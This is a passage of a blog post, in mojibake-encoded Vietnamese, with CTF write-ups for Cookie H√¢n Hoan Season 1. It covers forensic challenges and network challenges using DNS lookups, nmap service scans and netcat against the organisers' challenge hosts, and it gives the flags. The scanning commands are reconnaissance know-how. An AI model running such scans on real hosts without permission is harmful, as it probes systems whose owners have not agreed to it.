<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Writeups Cookie H√¢n Hoan Season 1 | th3_5had0w</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Writeups Cookie H√¢n Hoan Season 1" />
<meta name="author" content="th3_5had0w" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="FORENSIC" />
<meta property="og:description" content="FORENSIC" />
<link rel="canonical" href="https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html" />
<meta property="og:url" content="https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html" />
<meta property="og:site_name" content="th3_5had0w" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-11-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Writeups Cookie H√¢n Hoan Season 1" />
<script type="application/ld+json">
{"description":"FORENSIC","@type":"BlogPosting","url":"https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html","headline":"Writeups Cookie H√¢n Hoan Season 1","dateModified":"2021-11-05T00:00:00+00:00","datePublished":"2021-11-05T00:00:00+00:00","author":{"@type":"Person","name":"th3_5had0w"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://th3-5had0w.github.io/feed.xml" title="th3_5had0w" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">th3_5had0w<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/th3_5had0w_w"><i class="fab fa-twitter-square"></i></a><a class="color-purple-hover" href="https://github.com/th3-5had0w"><i class="fab fa-github-square"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="
            https://gravatar.com/avatar/4241e14141109999e63e51ba2f6eac59?s=256
        " class="author-avatar" alt="Avatar" />
    
Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i often solve math problems and play ctf!

</div>


<div class="post">
  <h1 class="post-title">Writeups Cookie H√¢n Hoan Season 1</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/network/">network</a>
      
      <a class="tag" href="/tag/forensic/">forensic</a>
      
      <a class="tag" href="/tag/crypto/">crypto</a>
      
      <a class="tag" href="/tag/cookiehanhoan/">cookiehanhoan</a>
      
  </div>
  
  <div class="post-date">Published on 05 Nov 2021</div>
  
  <h1 id="forensic">FORENSIC</h1>

<h2 id="exseller">Exseller</h2>
<blockquote>
  <p>ƒê·ªÉ kh√¥ng b·ªã M√®o nh√≤m ng√≥ t·ªáp t√†i li·ªáu quan tr·ªçng. G√† nhanh tay ƒë·∫∑t m·∫≠t kh·∫©u, nh∆∞ng l·∫°i v√¥ t√¨nh qu√™n m·∫•t. L√†m th·∫ø n√†o b√¢y gi·ªù T_T</p>
</blockquote>

<p>Ch∆∞∆°ng tr√¨nh cho ta 1 file excel <a href="">bruteme.xlxs</a>, th·ª≠ th√°ch n√†y ch·ªâ l√† 1 m·∫πo tin h·ªçc vƒÉn ph√≤ng b√¨nh th∆∞·ªùng, ta ch·ªâ ƒë·ªïi file extension t·ª´ xlxs th√†nh zip l√† c√≥ ngay m·ªôt file c√≥ th·ªÉ gi·∫£i n√©n ƒë∆∞·ª£c, gi·∫£i n√©n ra r·ªìi th√¨ m√¨nh ƒëi tham quan v√≤ng v√≤ng ·ªü trong m·∫•y th∆∞ m·ª•c m·ªôt ch√∫t, v√† m√¨nh ƒë·ªÉ √Ω ngay file n·∫±m ·ªü ƒë∆∞·ªùng d·∫´n <code class="language-plaintext highlighter-rouge">bruteme\xl\sharedStrings.xml</code>, m·ªü ra th√¨ ta th·∫•y lu√¥n flag n·∫±m trong ƒë√≥, th·ª≠ th√°ch n√†y kh√¥ng kh√≥ nh∆∞ng c≈©ng th√∫ v·ªã ƒë·ªëi v·ªõi c√°c b·∫°n newbie.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Micro$oft_Heck3r_Man}</code></p>

<h2 id="streamer">Streamer</h2>
<blockquote>
  <p>Anh ngh·ªá sƒ© nhi·ªÅu ƒëam m√™ ƒëang v·ªõt r√°c b√™n t√†u. Ta lang thang v·ªõi b·∫£n v·∫Ω ƒë·ªùi ta t·ª± t√¥ m√†u.</p>

  <p>√î! V·ªõt ƒë∆∞·ª£c c√°i g√¨ th√∫ z·ªã n√†y!</p>
</blockquote>

<p>Ch∆∞∆°ng tr√¨nh cho ta 1 file pcapng, v·∫≠y th√¨ l·∫°i wireshark th·∫ßn ch∆∞·ªüng th√¥i :ƒê</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer1.png" alt="" /></p>

<ul>
  <li>Hmm, c√≥ v·∫ª r·ªëi r·∫Øm, th√¥i v√¥ export object xem c√≥ l·ª•m ƒë∆∞·ª£c g√¨ kh√¥ng?</li>
</ul>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer2.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer3.png" alt="" /></p>

<p>Hmmm, 1 file rar √†, xem th·ª≠ coi c√≥ g√¨ n√†o</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer4.png" alt="" /></p>

<p>∆† b·∫Øt nh·∫≠p password √† üôÑ, m√≤ xem m·∫•y file kia c√≥ g√¨</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer5.png" alt="" /></p>

<p>·ªå, password n√®, nh·∫≠p v√¥ th·ª≠ ph√°t.</p>

<p>Eiii, c√≥ flag n√® =))</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{TCP_streamin_go_skrrrrrrrt}</code></p>

<h2 id="volatility">Volatility</h2>
<blockquote>
  <p>The true forenSeek</p>

  <p>Gi·ªØ nguy√™n hi·ªán tr∆∞·ªùng l√† vi·ªác c·∫ßn thi·∫øt trong qu√° tr√¨nh ƒëi·ªÅu tra s·ªë. M·ªôt trong nh·ªØng file l∆∞u tr·ªØ h√¨nh ·∫£nh c·ªßa RAM trong qu√° tr√¨nh l√†m ƒë·ªÅ thi ƒë∆∞·ª£c leak ra cho c√°c chi·∫øn binh. Cho m√¨nh th·∫•y c√°c c·∫≠u t√¨m ƒë∆∞·ª£c g√¨ n√†o :)</p>
</blockquote>

<p>Theo b·∫£n nƒÉng, khi g·∫∑p m·ªôt chall forensic m√¨nh s·∫Ω d√πng <code class="language-plaintext highlighter-rouge">strings</code> hay <code class="language-plaintext highlighter-rouge">grep</code> ƒë·ªÉ t√¨m flag tr∆∞·ªõc:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-i</span> flag<span class="o">{</span> <span class="nt">-a</span> <span class="nt">-C</span> 1 DESKTOP-K5GNI06-20211028-104628.raw
</code></pre></div></div>

<p>V√† n√≥ ƒë√£ xu·∫•t hi·ªán, ch·∫≥ng c·∫ßn ph·∫£i d√πng t·ªõi <code class="language-plaintext highlighter-rouge">volatility</code>, khi·ªÉn tr√°ch BTC =)))</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>L$ÔøΩ|\$Chu$ÔøΩ$ÔøΩ$ÔøΩ$ÔøΩ$«Ñ$&lt;ÔøΩlt$ÔøΩ,uÔøΩ|$$u$ÔøΩ$u$ÔøΩP$PÔøΩe$$K|$uL$ÔøΩ&lt;|\$$+C|ÔøΩj$D$0jPD$D$ÔøΩP$ÔøΩPÔøΩÔøΩÔøΩt$ tHWÔøΩ—ûD$uL$ÔøΩ|\$D$Chtu
L$ÔøΩ:|\$C|L$P+D$,$+D$0$D$@PPÔøΩu$PPL$XÔøΩut$ $ÔøΩÔøΩv$ÔøΩuÔøΩv$ÔøΩÔøΩD$D+$D$0D$H+$D$4L$,L$0QxÔøΩ,ÔøΩnL$0ÔøΩÔøΩÔøΩ$«Ñ$&lt;ÔøΩlt
                                                                                             $ÔøΩ)u|$u	L$ÔøΩ9||$\$$G@tuÔøΩuÔøΩuD$tD$Gw		https://pastebin.com/1vcbAg4WFlag{7ef31e58bd4086e294b4d700c721f35f} - Pastebin.com/-vx,HÔøΩHÔøΩ;ÔøΩ?Hs@HHqDLÔøΩÔøΩÔøΩqDL6LHvPHFH;ÔøΩÔøΩ_H[qDLÔøΩÔøΩÔøΩOqDH\$0Hl$8Ht$@Dw LwH|$HHÔøΩA^ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩHÔøΩHÔøΩDuHL$(&amp;
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{7ef31e58bd4086e294b4d700c721f35f}</code></p>

<h2 id="from-the-above">From The Above</h2>
<blockquote>
  <p>G√† v√† M√®o Yang H·ªì ƒë√£ c√πng nhau tho√°t kh·ªèi tr·ªçng l·ª±c, l·∫©n tr·ªën lo√†i ng∆∞·ªùi t·∫°i m·ªôt h√†nh tinh ƒë√†y ƒë·∫•t ƒë√°, v√† m·ªôt kh√≠ quy·ªÉn m·ªèng.</p>

  <p>V∆∞·ª£t qua ch·∫∑ng ƒë∆∞·ªùng 472 tri·ªáu km trong 7 th√°ng, ƒë√¢y l√† b·ª©c ·∫£nh ƒë·∫ßu ti√™n h·ªç g·ª≠i v·ªÅ tr√°i ƒë·∫•t.</p>

  <p>B·∫°n c√≥ gi·∫£i m√£ ƒë∆∞·ª£c nh·ªØng t√≠n hi·ªáu n√†y kh√¥ng?</p>
</blockquote>

<p>ƒê·ªÅ b√†i cho ta m·ªôt file audio v·ªõi nh·ªØng √¢m thanh bing bong b√≠p b√≠p, nh√¨n c·∫£ title mang ch·ªß ƒë·ªÅ v≈© tr·ª• v√† nghe ·∫•m thanh th√¨ m√¨nh ƒë√£ ki·ªÉu: ‚ÄúOxjt axjt, l·∫°i SSTV √† boi, chu·∫©n b·ªã ez game c√¢u n√†y.‚Äù</p>

<p>Nh∆∞ng kh√¥ng, m√¨nh d√πng QSSTV m√£i v·∫´n kh√¥ng ra, ch·ªânh t·∫ßn s·ªë input, output, ƒë·ªïi clock RX, TX c√°c ki·ªÉu,‚Ä¶ g·∫ßn c·∫£ 1 bu·ªïi chi·ªÅu v√† th·ª© m√¨nh nh·∫≠n l·∫°i kh√¥ng ph·∫£i l√† flag m√† l√† ch·ª©ng b·ªánh ƒëau n·ª≠a ƒë·∫ßu kinh ni√™n üôÇ</p>

<p>M√¨nh ƒë√£ quy·∫øt ƒë·ªãnh ‚Äú<a href="https://www.youtube.com/watch?v=qGRU3sRbaYw">anh xin gi∆° tay r√∫t lui th√¥i, tr√°ch ai b√¢y gi·ªù ƒë√¢y?</a>‚Äù nh∆∞ng v√†o ng√†y h√¥m sau m√¨nh quy·∫øt ƒë·ªãnh th·ª≠ l·∫°i ph√°t cu·ªëi, s·ª≠ d·ª•ng c√°c keyword nh∆∞ sstv, signal, satellite, decode, how to play ctf if im stupid, etc‚Ä¶ v√† cu·ªëi c√πng trong gi√¢y ph√∫t ‚Äú<a href="https://www.youtube.com/watch?v=mKxzJzp6oes">ng√†n l·∫ßn anh y·∫øu ƒëu·ªëi, ng√†n l·∫ßn ƒë·ªÉ n∆∞·ªõc m·∫Øt r∆°i</a>‚Äù m√¨nh th·∫•y m·ªôt c√°i tool t√™n l√† <code class="language-plaintext highlighter-rouge">noaa-apt</code>, m√¨nh c≈©ng ch·∫£ c√≥ hi v·ªçng g√¨ n·ªØa nh∆∞ng th√¥i c·ª© th·ª≠, m√¨nh ki·∫øm docs c·ªßa ph·∫ßn m·ªÅm n√†y ƒë·ªÉ ƒë·ªçc c√°ch s·ª≠ d·ª•ng v√† ƒëo√°n xem.</p>

<p>Sau khi c√†i, b·ªè file wav v√†o decode r·ªìi ·∫•n process th√¨ t·∫•m h√¨nh n√†y hi·ªán ra.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/from_the_above.png" alt="" /></p>

<p>Gi·∫£i ra ƒë∆∞·ª£c b√†i n√†y kh√¥ng kh√°c g√¨ ch√≥ ng√°p t√°p ru·ªìi, khox.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{h3ll0_fr0m_th3_0th3r_Sky}</code></p>

<h1 id="network">NETWORK</h1>

<h2 id="where-is-my-house">Where is my house?</h2>
<blockquote>
  <p>DNS c≈©ng ch·ª©a c√°c th√¥ng tin kh√°c, n√≥ g·ªçi l√† c√°c b·∫£n ghi (Record). B·∫°n th·ª≠ t√¨m xem domain n√†y c√≤n c√≥ nh·ªØng b·∫£n ghi n√†o ch·ª©a nh·ªØng ƒëi·ªÅu k√¨ qu·∫∑c kh√¥ng?
letspentest.org</p>
</blockquote>

<p>Ch·ªâ c·∫ßn nh·∫≠p t√™n mi·ªÅn ƒë·ªÅ b√†i cho l√™n trang <a href="https://dnsdumpster.com/">dnsdumpster</a> l√† ta th·∫•y ngay flag lu√¥n ·ªü ph·∫ßn TXT record.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{DNS_A_AAAA_TXT_CNAME}</code></p>

<h2 id="scan-me-if-you-can">Scan me if you can?</h2>
<blockquote>
  <p>N·∫øu coi m·ªói m√°y ch·ªß l√† m·ªôt ng√¥i nh√†, tr∆∞·ªõc khi x√¢m nh·∫≠p v√†o b√™n trong, c√°c Hacker ph·∫£i th·ª±c hi·ªán vi·ªác thƒÉm d√≤. H·ªç xem x√©t ƒë√¢u l√† ƒëi·ªÉm y·∫øu nh·∫•t c·ªßa ng√¥i nh√†, ch·ªó n√†o l√† ƒëi·ªÉm m√π camera? Ch·ªß nh√† ho·∫∑c b·∫£o v·ªá s·∫Ω ph·∫£n ·ª©ng th·∫ø n√†o khi c√≥ xu·∫•t hi·ªán c√°c d·∫•u hi·ªáu b·∫•t th∆∞·ªùng?</p>

  <p>Trong qu√° tr√¨nh t√¨m ki·∫øm l·ªó h·ªïng, Hazy th∆∞·ªùng xem x√©t ng√¥i nh√† n√†y c√≥ bao nhi√™u c√°nh c·ª≠a ƒëang m·ªü (Port). H√£y s·ª≠ d·ª•ng c√¥ng c·ª• th√¢n quen ƒë·ªÉ ‚Äún√©m ƒë√°‚Äù v√†o t·∫•t c·∫£ c√°c c√°nh c·ª≠a c·ªßa ng√¥i nh√†.</p>

  <p>Bi·∫øt r·∫±ng, c·ª≠a s·ªï ƒë∆∞·ª£c ƒë√°nh s·ªë t·ª´ 8100 t·ªõi 9100</p>

  <p>D·ª±a v√†o s·ª± ph·∫£n h·ªìi b·∫°n s·∫Ω bi·∫øt ƒë∆∞·ª£c nh·ªØng ƒëi·ªÅu th√∫ v·ªã!</p>

  <p>network-insecure.letspentest.org</p>
</blockquote>

<p>S·ª≠ d·ª•ng nmap ƒë·ªÉ scan v√† ta th·∫•y c√≥ 2 c·ªïng m·ªü l√† 9003 v√† 9004:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nmap -Pn -p 8100-9100 network-insecure.letspentest.org
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:47 PDT
Nmap scan report for network-insecure.letspentest.org (18.140.65.99)
Host is up (0.040s latency).
rDNS record for 18.140.65.99: ec2-18-140-65-99.ap-southeast-1.compute.amazonaws.com
Not shown: 999 filtered ports
PORT     STATE SERVICE
9003/tcp open  unknown
9004/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 64.66 seconds
</code></pre></div></div>

<p>Scan ti·∫øp t·ª´ng c·ªïng:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9003 network-insecure.letspentest.org
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:54 PDT
Nmap scan report for network-insecure.letspentest.org (18.140.65.99)
Host is up (0.042s latency).
rDNS record for 18.140.65.99: ec2-18-140-65-99.ap-southeast-1.compute.amazonaws.com

PORT     STATE SERVICE VERSION
9003/tcp open  http    nginx 1.20.0
|_http-server-header: Flag{Every-Header-Have-It-Own-Meaning}Date: Thu, 04 Nov 2021 02:54:41 GMT
|_http-title: Welcome to nginx!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9004 network-insecure.letspentest.org
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:55 PDT
Nmap scan report for network-insecure.letspentest.org (18.140.65.99)
Host is up (0.040s latency).
rDNS record for 18.140.65.99: ec2-18-140-65-99.ap-southeast-1.compute.amazonaws.com

PORT     STATE SERVICE  VERSION
9004/tcp open  ssl/http nginx
|_http-server-header: Flag{Every-Header-Have-It-Own-Meaning}Date: Thu, 04 Nov 2021 02:55:43 GMT
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=https://discord.gg/cookiehanhoan/organizationName=Flag{This-Is-A-Trusted-One}/stateOrProvinceName=Chicken-Little/countryName=VN
| Not valid before: 2021-10-28T14:15:27
|_Not valid after:  2022-10-28T14:15:27
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
</code></pre></div></div>

<p>Sau khi scan xong th√¨ v√¥ t√¨nh ta c√≥ c·∫£ 2 flag, flag c·ªßa c√¢u n√†y v√† flag c·ªßa c√¢u Secure HTTP lu√¥n m√† kh√¥ng c·∫ßn l√†m g√¨, m√¨nh nghƒ© c√≥ l·∫Ω BTC ƒë√£ setup l·ªói g√¨ ƒë√≥ ho·∫∑c c·ªë t√¨nh ƒë∆∞a ra 2 flag ƒë·ªÉ l·ª´a ng∆∞·ªùi ch∆°i?</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Every-Header-Have-It-Own-Meaning}</code></p>

<h2 id="very-good-shipper">Very Good Shipper</h2>
<blockquote>
  <p>H√£y tham gia ƒë·∫•u tr∆∞·ªùng Cookie phi√™n b·∫£n nhanh nh∆∞ ch·ªõp. G√† ph·∫£i ch·ªçn ra ƒë√°p √°n ƒë√∫ng trong th·ªùi gian nhanh nh·∫•t.</p>

  <p>Giao th·ª©c TCP s·∫Ω gi√∫p c√°c c√¢u tr·∫£ l·ªùi c·ªßa G√† lu√¥n ƒë∆∞·ª£c ƒë·∫£m b·∫£o g·ª≠i ƒë·∫øn m√°y ch·ªß c·ªßa Cookie Arena m√† kh√¥ng b·ªã r∆°i r·ªõt m·ªôt t·ª´ n√†o.</p>

  <p>Tuy nhi√™n, G√† ƒë√£ qu√™n c·ªïng k·∫øt n·ªëi v√†o m√°y ch·ªß. Ch·ªâ nh·ªõ mang m√°ng l√† n√≥ gi·ªëng v·ªõi th·ª≠ th√°ch ‚ÄúScan me if you can‚Äù</p>

  <p>network.letspentest.org</p>
</blockquote>

<p>Hmm, ƒë·ªÅ b√†i n√≥i l√† c·ªïng k·∫øt n√≥i gi·ªëng v·ªõi th·ª≠ th√°ch ‚ÄúScan me if you can‚Äù, v·∫≠y ta s·∫Ω ti·∫øn h√†nh scan lu√¥n 2 port 9003 v√† 9004.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9003 network.letspentest.org
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:59 PDT
Nmap scan report for network.letspentest.org (18.139.222.220)
Host is up (0.038s latency).
rDNS record for 18.139.222.220: ec2-18-139-222-220.ap-southeast-1.compute.amazonaws.com

PORT     STATE SERVICE VERSION
9003/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     Cookie Arena Season 1.
|     Cookie H
|     Hoan c
|     HACKER ???
|   JavaRMI: 
|     Cookie Arena Season 1.
|     trao gi
|     (write-up) cho BTC kh
|     A.Kh
|     HACKER ???
|   NULL: 
|     Cookie Arena Season 1.
|     Cookie H
|_    Hoan c
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9003-TCP:V=7.80%I=7%D=11/3%Time=61834CA0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,14B,"\nCh\xc3\xa0o\x20m\xe1\xbb\xabng\x20b\xe1\xba\xa1n\x20\xc4\x91\
SF:xe1\xba\xbfn\x20v\xe1\xbb\x9bi\x20c\xc3\xa1nh\x20c\xe1\xbb\xada\x20th\x
SF:e1\xbb\xad\x20th\xc3\xa1ch\x20c\xe1\xbb\xa7a\x20Cookie\x20Arena\x20Seas
SF:on\x201\.\n\x20\xc4\x90\xe1\xbb\x83\x20v\xc6\xb0\xe1\xbb\xa3t\x20qua\x2
SF:0th\xe1\xbb\xad\x20th\xc3\xa1ch\x20n\xc3\xa0y,\x20h\xc3\xa3y\x20tr\xe1\
SF:xba\xa3\x20l\xe1\xbb\x9di\x20\xc4\x91\xc3\xbang\x20c\xc3\xa1c\x20c\xc3\
SF:xa2u\x20h\xe1\xbb\x8fi\x20d\xc6\xb0\xe1\xbb\x9bi\x20\xc4\x91\xc3\xa2y\.
SF:\n\xe1\xbb\x9e\x20m\xe1\xbb\x97i\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20b\x
SF:e1\xba\xa1n\x20s\xe1\xba\xbd\x20c\xc3\xb3\x2010s\x20\xc4\x91\xe1\xbb\x8
SF:3\x20nh\xe1\xba\xadp\x20c\xc3\xa2u\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\
SF:x20A,\x20B,\x20C,\x20D\.\n\nCookie\x20H\xc3\xa2n\x20Hoan\x20c\xc3\xb3\x
SF:20bao\x20nhi\xc3\xaau\x20nh\xc3\xa2n\x20v\xe1\xba\xadt\x20ch\xc3\xadnh\
SF:?\nA\.3\nB\.4\nC\.2\nD\.1\n")%r(GenericLines,16D,"\nCh\xc3\xa0o\x20m\xe
SF:1\xbb\xabng\x20b\xe1\xba\xa1n\x20\xc4\x91\xe1\xba\xbfn\x20v\xe1\xbb\x9b
SF:i\x20c\xc3\xa1nh\x20c\xe1\xbb\xada\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x2
SF:0c\xe1\xbb\xa7a\x20Cookie\x20Arena\x20Season\x201\.\n\x20\xc4\x90\xe1\x
SF:bb\x83\x20v\xc6\xb0\xe1\xbb\xa3t\x20qua\x20th\xe1\xbb\xad\x20th\xc3\xa1
SF:ch\x20n\xc3\xa0y,\x20h\xc3\xa3y\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20
SF:\xc4\x91\xc3\xbang\x20c\xc3\xa1c\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20d\x
SF:c6\xb0\xe1\xbb\x9bi\x20\xc4\x91\xc3\xa2y\.\n\xe1\xbb\x9e\x20m\xe1\xbb\x
SF:97i\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20b\xe1\xba\xa1n\x20s\xe1\xba\xbd\
SF:x20c\xc3\xb3\x2010s\x20\xc4\x91\xe1\xbb\x83\x20nh\xe1\xba\xadp\x20c\xc3
SF:\xa2u\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20A,\x20B,\x20C,\x20D\.\n\nC
SF:ookie\x20H\xc3\xa2n\x20Hoan\x20c\xc3\xb3\x20bao\x20nhi\xc3\xaau\x20nh\x
SF:c3\xa2n\x20v\xe1\xba\xadt\x20ch\xc3\xadnh\?\nA\.3\nB\.4\nC\.2\nD\.1\n\n
SF:\(\x20\xe2\x80\xa2_\xe2\x80\xa2\)&gt;\xe2\x8c\x90\xe2\x96\xa0-\xe2\x96\xa0
SF:\x20HACKER\x20\?\?\?\n")%r(JavaRMI,1CD,"\nCh\xc3\xa0o\x20m\xe1\xbb\xabn
SF:g\x20b\xe1\xba\xa1n\x20\xc4\x91\xe1\xba\xbfn\x20v\xe1\xbb\x9bi\x20c\xc3
SF:\xa1nh\x20c\xe1\xbb\xada\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x20c\xe1\xbb
SF:\xa7a\x20Cookie\x20Arena\x20Season\x201\.\n\x20\xc4\x90\xe1\xbb\x83\x20
SF:v\xc6\xb0\xe1\xbb\xa3t\x20qua\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x20n\xc
SF:3\xa0y,\x20h\xc3\xa3y\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20\xc4\x91\x
SF:c3\xbang\x20c\xc3\xa1c\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20d\xc6\xb0\xe1
SF:\xbb\x9bi\x20\xc4\x91\xc3\xa2y\.\n\xe1\xbb\x9e\x20m\xe1\xbb\x97i\x20c\x
SF:c3\xa2u\x20h\xe1\xbb\x8fi\x20b\xe1\xba\xa1n\x20s\xe1\xba\xbd\x20c\xc3\x
SF:b3\x2010s\x20\xc4\x91\xe1\xbb\x83\x20nh\xe1\xba\xadp\x20c\xc3\xa2u\x20t
SF:r\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20A,\x20B,\x20C,\x20D\.\n\nNh\xe1\xbb\
SF:xafng\x20ng\xc6\xb0\xe1\xbb\x9di\x20\xc4\x91\xc6\xb0\xe1\xbb\xa3c\x20ba
SF:n\x20t\xe1\xbb\x95\x20ch\xe1\xbb\xa9c\x20l\xe1\xbb\xb1a\x20ch\xe1\xbb\x
SF:8dn\x20\xc4\x91\xe1\xbb\x83\x20trao\x20gi\xe1\xba\xa3i,\x20c\xc3\xb3\x2
SF:0ph\xe1\xba\xa3i\x20g\xe1\xbb\xadi\x20c\xc3\xa1ch\x20gi\xe1\xba\xa3i\x2
SF:0c\xc3\xa1c\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x20\(write-up\)\x20cho\x2
SF:0BTC\x20kh\xc3\xb4ng\?\nA\.Kh\xc3\xb4ng\nB\.C\xc3\xb3\n\n\(\x20\xe2\x80
SF:\xa2_\xe2\x80\xa2\)&gt;\xe2\x8c\x90\xe2\x96\xa0-\xe2\x96\xa0\x20HACKER\x20
SF:\?\?\?\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9004 network.letspentest.org
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 20:00 PDT
Nmap scan report for network.letspentest.org (18.139.222.220)
Host is up.
rDNS record for 18.139.222.220: ec2-18-139-222-220.ap-southeast-1.compute.amazonaws.com

PORT     STATE    SERVICE VERSION
9004/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
</code></pre></div></div>

<p>Nh∆∞ng scan th√¨ ta th·∫•y ·ªü c·ªïng 9003 c√≥ tr·∫£ v·ªÅ request l√† m·ªôt m·ªõ g√¨ ƒë√≥ h·ªón ƒë·ªôn, tr√¥ng gi·ªëng url encode.</p>

<p>Hmmmmm, nh√¨n c√≥ v·∫ª kh·∫£ nghi, oce, m√¨nh s·∫Ω d√πng ch∆∞∆°ng tr√¨nh nc ƒë·ªÉ th·ª≠ k·∫øt n·ªëi v√†o:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nc network.letspentest.org 9003

Ch√†o m·ª´ng b·∫°n ƒë·∫øn v·ªõi c√°nh c·ª≠a th·ª≠ th√°ch c·ªßa Cookie Arena Season 1.
 ƒê·ªÉ v∆∞·ª£t qua th·ª≠ th√°ch n√†y, h√£y tr·∫£ l·ªùi ƒë√∫ng c√°c c√¢u h·ªèi d∆∞·ªõi ƒë√¢y.
·ªû m·ªói c√¢u h·ªèi b·∫°n s·∫Ω c√≥ 10s ƒë·ªÉ nh·∫≠p c√¢u tr·∫£ l·ªùi A, B, C, D.

C√≥ bao nhi√™u ch·ªß ƒë·ªÅ trong Cookie Arena Season 1?
A.2
B.4
C.6
D.3
</code></pre></div></div>

<p>Ok, kh√¥ng nghi ng·ªù g√¨ n·ªØa, ƒë√¢y ch√≠nh l√† ch∆∞∆°ng tr√¨nh interactive th√¥ng qua netcat, ta c√≥ 2 c√°ch l√†m ·ªü ƒë√¢y, 1 l√† code ch∆∞∆°ng tr√¨nh socket ƒë·ªÉ t·ª± g·ª≠i v√† nh·∫≠n data, nh∆∞ng m√† ƒë√¢y to√†n l√† nh·ªØng c√¢u h·ªèi trivia, n√™n th√¥i, m√¨nh l√†m tay v·∫≠y :ƒê</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nc network.letspentest.org 9003

Ch√†o m·ª´ng b·∫°n ƒë·∫øn v·ªõi c√°nh c·ª≠a th·ª≠ th√°ch c·ªßa Cookie Arena Season 1.
